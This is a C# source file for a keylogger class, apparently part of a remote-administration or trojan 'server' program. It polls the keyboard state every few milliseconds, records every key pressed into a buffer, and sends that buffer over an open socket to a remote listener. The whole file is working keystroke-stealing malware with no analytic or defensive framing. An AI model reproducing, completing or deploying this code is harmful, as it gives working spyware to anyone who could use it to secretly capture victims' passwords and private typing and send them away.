using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Windows.Forms;

namespace ServerMain
{
    public class KeyLogger
    {
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey);

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Int32 vKey);

        public String KeyBuffer;
        Timer timerKeyMine;

        public KeyLogger()
        {
            KeyBuffer = "";
            timerKeyMine = new Timer();
            timerKeyMine.Tick += new System.EventHandler(timerKeyMine_Tick);
            timerKeyMine.Interval = 5;
            timerKeyMine.Enabled = true;
        }

        private void timerKeyMine_Tick(object sender, EventArgs e)
        {
            foreach (Int32 i in Enum.GetValues(typeof(Keys)))
            {
                if (GetAsyncKeyState(i) == -32767)
                {
                    KeyBuffer += Enum.GetName(typeof(Keys), i) + " ";
                }
            }
        }

        public void keylogStart()
        {
            timerKeyMine.Start();
        }

        public void keylogStop()
        {
            timerKeyMine.Stop();
        }

        public void flushKeyBuffer()
        {
            MemoryStream dataStream = new MemoryStream();
            MemoryStream dataSize = new MemoryStream();
            BinaryFormatter formatter = new BinaryFormatter();
            formatter.Serialize(dataStream, KeyBuffer);
            KeyBuffer = "";
            formatter.Serialize(dataSize, dataStream.ToArray().Length);
            ServerMain.socketConnect.Send(dataSize.ToArray());
            byte[] ack = new byte[1];
            while (ServerMain.socketAccept.Receive(ack) == 0) ;
            ServerMain.socketConnect.Send(dataStream.ToArray());
        }
    }
}
